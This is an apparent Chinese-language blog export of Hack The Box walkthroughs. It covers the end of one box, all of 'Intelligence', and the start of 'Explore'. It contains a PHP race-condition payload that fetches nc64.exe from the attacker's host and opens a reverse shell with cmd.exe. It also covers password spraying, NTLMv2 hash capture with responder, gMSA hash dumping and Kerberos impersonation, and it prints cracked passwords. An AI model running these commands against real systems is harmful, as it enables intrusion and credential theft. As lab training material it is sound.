web:charlotte123!:PROPER:4141414141414141:e73cd0da1ecd6a53908ce1117b61d53c:010100000000000000379e157675d70156bee2cc93aced8e000000000100100054006e00520063006e006a006e0063000300100054006e00520063006e006a006e0063000200100055004500650052004a004e006f004f000400100055004500650052004a004e006f004f000700080000379e157675d70106000400020000000800300030000000000000000000000000200000cc94dbb5a4a8ccad357314b70a1060b2abd390224562589501139c5005a818470a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030002e00310034002e00320034000000000000000000 1 password hash cracked, 0 left 成功获得了一个账户密码 username = web password = charlotte123! 使用账号密码重新执行smb服务 python3 /usr/share/doc/python3-impacket/examples/smbserver.py -ip 10.10.14.24 -username web -password charlotte123! -smb2support eval . 在本地编写一个条件竞争的sh脚本，保存为race.sh #!/bin/bash PAYLOAD=$1 while :; do echo hello world &gt; header.inc echo &quot;$PAYLOAD&quot; &gt; header.inc done 然后运行脚本 ./race.sh &#39;&lt;?php phpinfo(); ?&gt;&#39; 然后再次请求网页 http://10.10.10.231/licenses/licenses.php?theme=//10.10.14.24/evil&amp;h=d1a79488ed1966002feef92cabc0ccc8 成功返回了phpinfo界面 可能一次不行，多刷新几次 现在咱们在本地放一个netcat.exe，上传到靶机里来反弹shell 首先使用Python3在本地开启一个http服务器 python3 -m http.server 80 然后运行脚本 ./race.sh &#39;&lt;?php system(&quot;cmd /c powershell iwr http://10.10.14.24/nc64.exe -outf \\windows\\system32\\spool\\drivers\\color\\cute.exe&quot;); ?&gt;&#39; ┌──(root💀root)-[~/Desktop] └─# python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 5555 (http://0.0.0.0:5555/) ... 10.10.10.231 - - [11/Jul/2021 09:06:05] &quot;GET /nc64.exe HTTP/1.1&quot; 200 - 接收到GET请求就是执行成功了，现在我们使用nc在本地监听一个端口 nc -nvlp 4444 然后利用我们刚才上传的nc64.exe来反弹shell ./race.sh &#39;&lt;?php system(&quot;cmd /c start \\windows\\system32\\spool\\drivers\\color\\cute.exe 10.10.14.24 4444 -e cmd.exe&quot;); ?&gt;&#39; 成功弹回shell c:\\Users\\web\\Desktop&gt;type user.txt type user.txt 48129e580da3dc57a121551b897d1f5a 成功拿到user权限的flag ## 权限提升 进入 c:\\Program Files\\Cleanup&gt;dir dir Volume in drive C has no label. Volume Serial Number is FE0C-A36B Directory of c:\\Program Files\\Cleanup 11/15/2020 05:05 AM &lt;DIR&gt; . 11/15/2020 05:05 AM &lt;DIR&gt; .. 11/15/2020 05:03 AM 2,999,808 client.exe 11/15/2020 10:22 AM 174 README.md 11/15/2020 06:20 AM 3,041,792 server.exe 3 File(s) 6,041,774 bytes 2 Dir(s) 7,353,192,448 bytes free 我在C:Filesclient.exe和server.exe 这就是咱们提权的突破口了 mklink /j \\users\\web\\downloads\\lucifiel \\users\\administrator\\desktop 先做一个链接 操控管道\\\\.\\pipe\\cleanuppipe echo CLEAN \\users\\web\\downloads\\lucifiel\\root.txtx &gt; \\\\.\\pipe\\cleanuppipe 此时Server.exe会通过管道的内容来运行程序, 会将程序加密并移动至\\programdata\\cleanup(这个程序应该是administrator运行的) 删掉链接, 创建文件夹, 再还原文件 rmdir \\users\\web\\downloads\\lucifiel mkdir \\users\\web\\downloads\\lucifiel echo RESTORE \\users\\web\\downloads\\lucifiel\\root.txtx &gt; \\\\.\\pipe\\cleanuppipe type \\users\\web\\downloads\\lucifiel\\root.txt 9b07cf2c755f11c5545475416fb3a74f 成功获得root权限的flag PS：逆向这块儿我不会，我直接抄的答案 下面贴上我抄的答案的原文 Analysis of client.exeReverse engineering of client.exe shows the need to supply an argument in order to “make it do something”. You can see from above that by supplying a -R and a file path triggers the main_serviceRestore function which in turn calls upon a named pipe client to connect to a named pipe, cleanupPipe. Further down the control flow graph, this is what’s actually sent across the named pipe. Analysis of server.exe Suppose we replicate the behaviors of client.exe and server.exe in a Windows 10 installation. This is what we have determined above This is what’s displayed in server.exe. Hmm, where have I seen C:before? By the way, dGVzdA&#x3D;&#x3D; is the base64-encoded string of test. On top of that, this is evidence that a named pipe, cleanupPipe is listening for data. We can send our own data to server.exe with good ol’ command prompt using the echo command like so. Meanwhile in server.exe, I see this… Something’s not right. One character is truncated. In any case, all I have to do is to add one more character behind the path. Well, this is what happened. CLEAN removes the file specified in the file path and move it to C: and its content encrypted with AES-GCM. Conversely, RESTORE restores the file back to the original file path by decrypting the file contents and decoding the file path.","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Intelligence - Hackthebox","slug":"Hackthebox/Medium/Hackthebox-Intelligence","date":"2021-07-07T11:38:36.000Z","updated":"2023-06-13T03:44:57.000Z","comments":true,"path":"2021/07/07/Hackthebox/Medium/Hackthebox-Intelligence/","link":"","permalink":"http://www.lucifiel.com/2021/07/07/Hackthebox/Medium/Hackthebox-Intelligence/","excerpt":"","text":"Hackthebox - Intelligence靶场信息 靶场类型 信息搜集首先使用nmap进行端口扫描 ┌──(root💀root)-[~/Desktop] └─# nmap -A -sS -sC -sV -p- 10.10.10.248 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-07 09:27 CST Nmap scan report for 10.10.10.248 Host is up (0.24s latency). Not shown: 65515 filtered ports PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: Intelligence 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2021-07-07 08:49:30Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2021-07-07T08:51:09+00:00; +7h12m23s from scanner time. 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2021-07-07T08:51:10+00:00; +7h12m23s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2021-07-07T08:51:09+00:00; +7h12m23s from scanner time. 3269/tcp open ssl/ldap Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name) | ssl-cert: Subject: commonName=dc.intelligence.htb | Subject Alternative Name: othername:&lt;unsupported&gt;, DNS:dc.intelligence.htb | Not valid before: 2021-04-19T00:43:16 |_Not valid after: 2022-04-19T00:43:16 |_ssl-date: 2021-07-07T08:51:10+00:00; +7h12m23s from scanner time. 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 9389/tcp open mc-nmf .NET Message Framing 49666/tcp open msrpc Microsoft Windows RPC 49677/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 49678/tcp open msrpc Microsoft Windows RPC 49688/tcp open msrpc Microsoft Windows RPC 49700/tcp open msrpc Microsoft Windows RPC 58859/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port OS fingerprint not ideal because: Missing a closed TCP port so results incomplete No OS matches for host Network Distance: 2 hops Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 7h12m22s, deviation: 0s, median: 7h12m22s | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2021-07-07T08:50:31 |_ start_date: N/A TRACEROUTE (using port 139/tcp) HOP RTT ADDRESS 1 241.20 ms 10.10.14.1 2 241.20 ms 10.10.10.248 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 648.79 seconds 在上面我们得到的重要信息有： 开启80端口的HTTP服务 开启SMB服务 有两个域名intelligence.htb和dc.intelligence.htb 有Kerberos可能涉及内网渗透 咱们一个一个来看，首先先把域名添加到hosts里 echo 10.10.10.248 dc.intelligence.htb intelligence.htb &gt; /etc/hosts 然后咱们去查看一下这两个域名 这两个域名的内容似乎是一样的，找到了两个PDF文件 http://intelligence.htb/documents/2020-12-15-upload.pdf http://intelligence.htb/documents/2020-01-01-upload.pdf 翻译后没看到什么有用的信息，但毕竟是PDF文件，咱们使用exiftool进行查看 exiftool 2020-01-01-upload.pdf exiftool 2020-12-15-upload.pdf 在PDF文件中读取到了一个名为Creator的字段，这个一般不是正常情况，先记录一下吧。 William.Lee Jose.Williams 这个可能是两个用户名 我们观察一下这两个pdf文件的命名规则，会发现，变动的只有日期。那么，是否还有其他的pdf文件呢？让我们测试一下 可以看到，确实是存在的。 然后，我找到了一个脚本，感谢kavigihan师傅写的脚本 #!/usr/bin/python3 # Author: kavigihan import requests import os def fuzz_PDFs(): with open(&#39;days&#39;, &#39;r&#39;) as d: days = d.readlines() with open(&#39;months&#39; ,&#39;r&#39;) as m: months = m.readlines() url_file = open(&#39;urls&#39;, &#39;w&#39;) url_file.close() for month in months: for day in days: r = requests.get(f&#39;http://dc.intelligence.htb/documents/2020-{day.strip()}-{month.strip()}-upload.pdf&#39;) if int(r.status_code) == 200: print(f&#39;http://dc.intelligence.htb/documents/2020-{day.strip()}-{month.strip()}-upload.pdf&#39;) with open(&#39;urls&#39;, &#39;a&#39;) as url_file: url_file.write(f&#39;http://dc.intelligence.htb/documents/2020-{day.strip()}-{month.strip()}-upload.pdf&#39;) url_file.write(&#39;\\n&#39;) def get_PDFs(): with open(&#39;urls&#39;, &#39;r&#39;) as u: urls = u.readlines() for url in urls: os.system(f&quot;wget -q {url.strip()} &quot;) print(f&#39;[+] Downloading -- {url.strip()} &#39;) fuzz_PDFs() get_PDFs() 保存到本地，然后生成两个字典 seq 1 31 &gt; days; seq 1 12 &gt; months 记得手动在生成出来的字典内，把1-9添加上0，比如1月就改为01月 然后执行该脚本 python3 exploit.py 使用命令 cat *.pdf|strings |grep Creator|cut -d &#39;(&#39; -f 2|cut -d &#39;)&#39; -f 1|grep -v TeX &gt; users;cat users 提权pdf文件内的用户名 ┌──(root💀root)-[~/Desktop] └─# cat *.pdf|strings |grep Creator|cut -d &#39;(&#39; -f 2|cut -d &#39;)&#39; -f 1|grep -v TeX &gt; users;cat users William.Lee Scott.Scott Jason.Wright Veronica.Patel Jose.Williams Brian.Morris Jennifer.Thomas Thomas.Valenzuela David.Mcbride Jose.Williams Anita.Roberts Brian.Baker Jose.Williams David.Mcbride David.Reed Kaitlyn.Zimmerman Jason.Patterson Thomas.Valenzuela David.Mcbride Darryl.Harris David.Wilson Scott.Scott Teresa.Williamson John.Coleman Samuel.Richardson Ian.Duncan Jason.Wright Travis.Evans David.Mcbride Jessica.Moody Ian.Duncan Anita.Roberts Kaitlyn.Zimmerman Jose.Williams Stephanie.Young Samuel.Richardson Tiffany.Molina Ian.Duncan 接着在文件2020-06-04-upload.pdf中发现了一个默认密码 New Account Guide Welcome to Intelligence Corp! Please login using your username and the default password of: NewIntelligenceCorpUser9876 After logging in please change your password as soon as possible. 使用exiftool查看该pdf，获得了用户名Jason.Patterson，这样我们就有了一个账户密码 username = Jason.Patterson password = NewIntelligenceCorpUser9876 咱们直接使用smb进行登录 smbclient -L //10.10.10.248 -U Tiffany.Molina 但当我尝试登录的时候，却提示我失败了。估计是账户密码不匹配，没办法，只能爆破一波了 使用crackmapexec进行爆破 crackmapexec smb 10.10.10.248 -u users -p “NewIntelligenceCorpUser9876” ┌──(root💀root)-[~/Desktop] └─# crackmapexec smb 10.10.10.248 -u users -p NewIntelligenceCorpUser9876 [*] Initializing LDAP protocol database [*] Generating SSL certificate SMB 10.10.10.248 445 DC [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False) SMB 10.10.10.248 445 DC [-] intelligence.htb\\William.Lee:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Veronica.Patel:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Travis.Evans:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [-] intelligence.htb\\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE SMB 10.10.10.248 445 DC [+] intelligence.htb\\Tiffany.Molina:NewIntelligenceCorpUser9876 成功获得正确的smb账号和密码 username = Tiffany.Molina password = NewIntelligenceCorpUser9876 登录smb进行查看 ┌──(root💀root)-[~/Desktop] └─# smbclient -L //10.10.10.248 -U Tiffany.Molina Enter WORKGROUP\\Tiffany.Molina&#39;s password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC IT Disk NETLOGON Disk Logon server share SYSVOL Disk Logon server share Users Disk SMB1 disabled -- no workgroup available 登录成功，咱们查找一下看看有没有什么可利用的文件吧 可以查看的就IT和Users目录，咱们分别去查看一下 smbclient //10.10.10.248/IT -U Tiffany.Molina smbclient //10.10.10.248/Users -U Tiffany.Molina 在IT目录下找到了一个ps1的文件 ──(root💀root)-[~/Desktop] └─# smbclient //10.10.10.248/IT -U Tiffany.Molina 130 ⨯ Enter WORKGROUP\\Tiffany.Molina&#39;s password: Try &quot;help&quot; to get a list of possible commands. smb: \\&gt; ls . D 0 Mon Apr 19 08:50:55 2021 .. D 0 Mon Apr 19 08:50:55 2021 downdetector.ps1 A 1046 Mon Apr 19 08:50:55 2021 3770367 blocks of size 4096. 1330536 blocks available smb: \\&gt; get downdetector.ps1 getting file \\downdetector.ps1 of size 1046 as downdetector.ps1 (1.1 KiloBytes/sec) (average 1.1 KiloBytes/sec) 先下载下来，咱们去看看users目录 在Users\\Tiffany.Molina\\Desktop下找到了user.txt文件 smb: \\Tiffany.Molina\\Desktop\\&gt; get user.txt getting file \\Tiffany.Molina\\Desktop\\user.txt of size 34 as user.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec) ┌──(root💀root)-[~/Desktop] └─# cat user.txt 1 ⚙ 6d148717e36be40a48439bdf34ea3054 成功获得user权限的flag文件 漏洞利用查看一下downdetector.ps1文件的内容 ┌──(root💀root)-[~/Desktop] └─# cat downdetector.ps1 1 ⚙ ��# Check web server status. Scheduled to run every 5min Import-Module ActiveDirectory foreach($record in Get-ChildItem &quot;AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb&quot; | Where-Object Name -like &quot;web*&quot;) { try { $request = Invoke-WebRequest -Uri &quot;http://$($record.Name)&quot; -UseDefaultCredentials if(.StatusCode -ne 200) { Send-MailMessage -From &#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39; -To &#39;Ted Graves &lt;Ted.Graves@intelligence.htb&gt;&#39; -Subject &quot;Host: $($record.Name) is down&quot; } } catch {} } 我们解读一下该文件的内容，每五分钟，它会检查以“web”开头的域intelligence.htb的任何DNS记录，并使用Ted的凭据为每个找到的域发送HTTP请求。(使用-UseDefaultCredentials选项)如果服务器没有返回200 OK状态码，则会向Ted发送一封邮件。 我们要做的是使用dnstool.py添加一个从web开始不存在的假VHOST到zone。这样就会触发脚本向Ted发送邮件。 &gt; https://github.com/dirkjanm/krbrelayx/blob/master/dnstool.py python3 dnstool.py -u &#39;intelligence.htb\\Tiffany.Molina&#39; -p &#39;NewIntelligenceCorpUser9876&#39; -a add -r &#39;weboops.intelligence.htb&#39; -d 10.10.14.40 10.10.10.248 10.10.14.40 是我们本地的IP 10.10.10.248 是靶机的IP 该脚本会向我们发送电子邮件，因此我们使用responder来进行嗅探并捕获Ted用户的密码Hash值 responder -I tun0 -A 执行后，由于该脚本每五分钟检查一次，所以咱们需要等等 ┌──(root💀root)-[~/Desktop] └─# responder -I tun0 -A __ .----.-----.-----.-----.-----.-----.--| |.-----.----. | _| -__|__ --| _ | _ | | _ || -__| _| |__| |_____|_____| __|_____|__|__|_____||_____|__| |__| NBT-NS, LLMNR &amp; MDNS Responder 3.0.2.0 Author: Laurent Gaffie (laurent.gaffie@gmail.com) To kill this script hit CTRL-C [+] Poisoners: LLMNR [ON] NBT-NS [ON] DNS/MDNS [ON] [+] Servers: HTTP server [ON] HTTPS server [ON] WPAD proxy [OFF] Auth proxy [OFF] SMB server [ON] Kerberos server [ON] SQL server [ON] FTP server [ON] IMAP server [ON] POP3 server [ON] SMTP server [ON] DNS server [ON] LDAP server [ON] RDP server [ON] [+] HTTP Options: Always serving EXE [OFF] Serving EXE [OFF] Serving HTML [OFF] Upstream Proxy [OFF] [+] Poisoning Options: Analyze Mode [ON] Force WPAD auth [OFF] Force Basic Auth [OFF] Force LM downgrade [OFF] Fingerprint hosts [OFF] [+] Generic Options: Responder NIC [tun0] Responder IP [10.10.14.40] Challenge set [random] Don&#39;t Respond To Names [&#39;ISATAP&#39;] [i] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned. [Analyze mode: ICMP] You can ICMP Redirect on this network. [Analyze mode: ICMP] This workstation (10.10.14.40) is not on the same subnet than the DNS server (192.168.72.2). [Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details. [+] Listening for events... [HTTP] NTLMv2 Client : 10.10.10.248 [HTTP] NTLMv2 Username : intelligence\\Ted.Graves [HTTP] NTLMv2 Hash : Ted.Graves::intelligence:0daa3ec1b284a成功捕获hash，咱们保存到本地 咱们这里使用john进行hash爆破，大家也可以使用其他工具，比如hashcat john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt 爆破完以后查看hash.txt johb --show hash.txt 成功获得账号密码 username = Ted.Graves password = Mr.Teddy 我们成功拿到了Ted的账户密码，所以我们尝试将用户共享挂载为Ted并枚举 mkdir mount ;sudo mount //10.10.10.248/Users mount/ -o username=”Ted.Graves”,password=”Mr.Teddy” 可惜的是，并没有什么有用的东西，苦于没有思路，我又去检查了一遍之前找到的文件，在2020-12-30-upload.pdf中，还真发现了点东西 Internal IT Update There has recently been some outages on our web servers. Ted has gotten ascript in place to help notify us if this happens again.Also, after discussion following our recent security audit we are in the processof locking down our service accounts. 大致意思就是说他们还没有锁定服务账户。通过Google查找后发现，如果启用了服务账户，那我们可以使用gMASDumper.py转储Hash值。 权限提升 https://github.com/micahvandeusen/gMSADumper 咱们使用这个脚本为Ted获取一个NTHash python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb ┌──(root💀root)-[~/Desktop/gMSADumper] └─# python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2 有了这个之后，咱们可以做PTT（Pass The Ticket）攻击。 咱们使用ntpdate进行利用 ntpdate 10.10.10.248 如果运行后时间没有更改，使用以下方法解决 apt-get install chrony timedatectl set-ntp true ntpdate 10.10.10.248 使用python自带的getST.py以管理员身份获取票据，以便于我们以用户身份运行命令 python3 /usr/share/doc/python3-impacket/examples/getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate administrator ┌──(root💀root)-[~/Desktop/gMSADumper] └─# python3 /usr/share/doc/python3-impacket/examples/getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :d64b83fe606e6d3005e20ce0ee932fe2 -impersonate administrator 127 ⨯ Impacket v0.9.21 - Copyright 2020 SecureAuth Corporation [*] Getting TGT for user [*] Impersonating administrator [*] Requesting S4U2self [*] Requesting S4U2Proxy [*] Saving ticket in administrator.ccache 票据已保存为administrator.ccache，有了这个票据，我们就可以使用各种工具进行利用了 使用export来将票据作为环境变量 export KRB5CCNAME=administrator.ccache 这里我们继续使用python的工具smbclient.py进行利用 python3 /usr/share/doc/python3-impacket/examples/smbclient.py -k intelligence.htb/Administrator@dc.intelligence.htb -no-pass 进入后，我们就成功使用smbclient.py登录到smb里了 进入后，咱们获取root权限的flag文件即可 shares use Users ls cd Administrator cd Desktop get root.txt ┌──(root💀root)-[~/Desktop] └─# cat root.txt 69f9f1591b2d1701721d539a138c3ce9 成功获得root权限的flag文件 收工睡觉","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Explore - Hackthebox","slug":"Hackthebox/Easy/Hackthebox-Explore","date":"2021-07-06T11:38:36.000Z","updated":"2023-06-13T03:44:00.000Z","comments":true,"path":"2021/07/06/Hackthebox/Easy/Hackthebox-Explore/","link":"","permalink":"http://www.lucifiel.com/2021/07/06/Hackthebox/Easy/Hackthebox-Explore/","excerpt":"","text":"Hackthebox - Explore靶场信息 靶场类型 信息搜集首先使用nmap进行信息搜集 nmap -A -sS -sC -sV -p- 10.10.10.247 ┌──(root💀root)-[~/Desktop] └─# nmap -A -sS -sC -sV -p- 10.10.10.247 Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-06 17:01 CST Nmap scan report for explore.htb (10.10.10.247) Host is up (0.25s latency). Not shown: 65530 closed ports PORT STATE SERVICE VERSION 2222/tcp open ssh (protocol 2.0) | fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio | ssh-hostkey: |_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA) 5555/tcp filtered freeciv 38237/tcp open unknown | fingerprint-strings: | GenericLines: | HTTP/1.0 400 Bad Request | Date: Tue, 06 Jul 2021 09:28:06 GMT | Content-Length: 22 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | GetRequest: | HTTP/1.1 412 Precondition Failed | Date: Tue, 06 Jul 2021 09:28:06 GMT | Content-Length: 0 | HTTPOptions: | HTTP/1.0 501 Not Implemented | Date: Tue, 06 Jul 2021 09:28:11 GMT | Content-Length: 29 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Method not supported: OPTIONS | Help: | HTTP/1.0 400 Bad Request | Date: Tue, 06 Jul 2021 09:28:28 GMT | Content-Length: 26 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: HELP | RTSPRequest: | HTTP/1.0 400 Bad Request | Date: Tue, 06 Jul 2021 09:28:11 GMT | Content-Length: 39 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | valid protocol version: RTSP/1.0 | SSLSessionReq: | HTTP/1.0 400 Bad Request | Date: Tue, 06 Jul 2021 09:28:28 GMT | Content-Length: 73 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | ?G???,???`~? | ??{????w????&lt;=?o? | TLSSessionReq: | HTTP/1.0 400 Bad Request | Date: Tue, 06 Jul 2021 09:28:29 GMT | Content-Length: 71 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: | ??random1random2random3random4 | TerminalServerCookie: | HTTP/1.0 400 Bad Request | Date: Tue, 06 Jul 2021 09:28:29 GMT | Content-Length: 54 | Content-Type: text/plain; charset=US-ASCII | Connection: Close | Invalid request line: |_ Cookie: mstshash=nmap 42135/tcp open http ES File Explorer Name Response httpd |_http-server-header: ES Name Response Server |_http-title: Site doesn&#39;t have a title (text/html). 59777/tcp open http Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older |_http-title: Site doesn&#39;t have a title (text/plain). 2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service : ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port2222-TCP:V=7.91%I=7%D=7/6%Time=60E41F41%P=x86_64-pc-linux-gnu%r(NUL SF:L,24,&quot;SSH-2\\.0-SSH\\x20Server\\x20-\\x20Banana\\x20Studio\\r\\n&quot;); ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)============== SF-Port38237-TCP:V=7.91%I=7%D=7/6%Time=60E41F41%P=x86_64-pc-linux-gnu%r(Ge SF:nericLines,AA,&quot;HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Tue,\\x200 SF:6\\x20Jul\\x202021\\x2009:28:06\\x20GMT\\r\\nContent-Length:\\x2022\\r\\nContent SF:-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r SF:\\nInvalid\\x20request\\x20line:\\x20&quot;)%r(GetRequest,5C,&quot;HTTP/1\\.1\\x20412\\x SF:20Precondition\\x20Failed\\r\\nDate:\\x20Tue,\\x2006\\x20Jul\\x202021\\x2009:28 